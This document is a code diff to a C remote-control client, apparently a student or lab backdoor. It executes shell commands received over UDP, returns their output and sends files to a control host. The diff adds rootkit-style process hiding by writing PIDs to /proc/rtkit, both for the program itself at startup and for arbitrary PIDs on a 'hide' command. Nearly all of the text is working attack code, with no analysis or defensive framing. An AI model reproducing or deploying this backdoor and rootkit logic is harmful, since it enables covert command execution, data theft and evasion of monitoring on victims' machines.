@@ -32,7 +32,6 @@ void printError(int sort, char *err) {
             printf("\e[33mERR:");break;
     }
     printf(" %s\n\e[0m", err);
-    exit(-1);
 }
 
 void *start_routine(void *arg) {
@@ -56,18 +55,30 @@ void sendOnline() {
         printError(2, strerror(errno));
 }
 
+void initRemote() {
+    int pid = getpid();
+    char command[64];
+
+    // Hidden process
+    bzero(command, sizeof(command));
+    sprintf(command, "echo -n hp%d > /proc/rtkit", pid);
+    popen(command, "r");
+    // popen("chmod 755 *", "r");
+    // popen("sh ./init.sh", "r");
+
+}
+
 int main(int argc, char const *argv[]) {
     int x, z, ret, filelen;
     char *control_ip = "127.0.0.1";
-    char command[16], path[128], filename[256];
-    char endcmd[10] = "___EOF___\n";
+    char hidepid[8], command[64], path[128], filename[256];
+    char eof[10] = "___EOF___\n";
     pthread_t thread;
 
     FILE *fp;  // It will open a stream for the output of command
 
     // Initialize the host machine
-    // popen("chmod 755 *", "r");
-    // popen("./init.sh", "r");
+    initRemote();
 
     sockfd = socket(AF_INET, SOCK_DGRAM, 0);
     bzero(&control_add, sizeof(control_add));
@@ -100,6 +111,7 @@ int main(int argc, char const *argv[]) {
         datagram[z] = 0;
         printf("Command:%s", datagram);
 
+        bzero(command, sizeof(command));
         sscanf(datagram, "%[^ ]", command);
         // Use function chdir() to replacement command 'cd'
         if (strcmp(command, "cd") == 0) {
@@ -107,15 +119,28 @@ int main(int argc, char const *argv[]) {
             sscanf(datagram, "%*3s%s", path);
             if (chdir(path) == -1) {
                 printf("Chdir: %s\n", strerror(errno));
-            }else {
+            }else
                 fp = popen("pwd", "r");
-            }
             bzero(path, sizeof(path));
         }
         // Continue to send on-line message
         else if (strcmp(command, "quit\n") == 0) {
             bzero(command, sizeof(command));
             run = 1;
+        }
+        // Quit the remote
+        else if (strcmp(command, "sendquit\n") == 0) {
+            bzero(command, sizeof(command));
+            break;
+        }
+        // Hide process with given id
+        else if (strcmp(command, "hide") == 0) {
+            bzero(command, sizeof(command));
+            sscanf(datagram, "%*5s%s", hidepid);
+            sprintf(command, "echo -n hp%s > /proc/rtkit", hidepid);
+            printf("%s\n", command);
+            bzero(hidepid, sizeof(hidepid));
+            popen(command, "r");
         }
         // Transfer file to the control machine
         else if (strcmp(command, "tran") == 0) {
@@ -128,20 +153,20 @@ int main(int argc, char const *argv[]) {
             while(1){
                 bzero(datagram, LENGTH);
                 fread(datagram, LENGTH, 1, fp);
-                if(filelen >= LENGTH){
+                if (filelen >= LENGTH) {
                     x = sendto(sockfd, datagram, LENGTH, 0, (struct sockaddr *)&control_add, sizeof(struct sockaddr_in));
                     if (x == -1) {
-                        printf("ERR_sendto: %s\n", strerror(errno));
+                        printError(2, strerror(errno));
                         break;
                     }
                     filelen -= x;
-                }else{
+                }else {
                     x = sendto(sockfd, datagram, filelen, 0, (struct sockaddr *)&control_add, sizeof(struct sockaddr_in));
                     if (x == -1) {
-                        printf("ERR_sendto: %s\n", strerror(errno));
+                        printError(2, strerror(errno));
                         break;
                     }
-                    x = sendto(sockfd, endcmd, strlen(endcmd), 0, (struct sockaddr *)&control_add, sizeof(struct sockaddr_in));
+                    x = sendto(sockfd, eof, sizeof(eof), 0, (struct sockaddr *)&control_add, sizeof(struct sockaddr_in));
                     break;
                 }
             }
@@ -157,12 +182,14 @@ int main(int argc, char const *argv[]) {
         // Collecting the output and sending to the control machine
         while(fgets(datagram, sizeof(datagram)-1, fp) != NULL) {
             x = sendto(sockfd, datagram, strlen(datagram), 0, (struct sockaddr *)&control_add, sizeof(control_add));
-            if (x == -1)
+            if (x == -1) {
                 printError(2, strerror(errno));
+                break;
+            }
             bzero(datagram, sizeof(datagram));
         }
         // Marking the end of output of command
-        strcpy(datagram, "___EOF___\n");
+        strcpy(datagram, eof);
         x = sendto(sockfd, datagram, strlen(datagram), 0, (struct sockaddr *)&control_add, sizeof(control_add));
         if (x == -1)
             printError(2, strerror(errno));
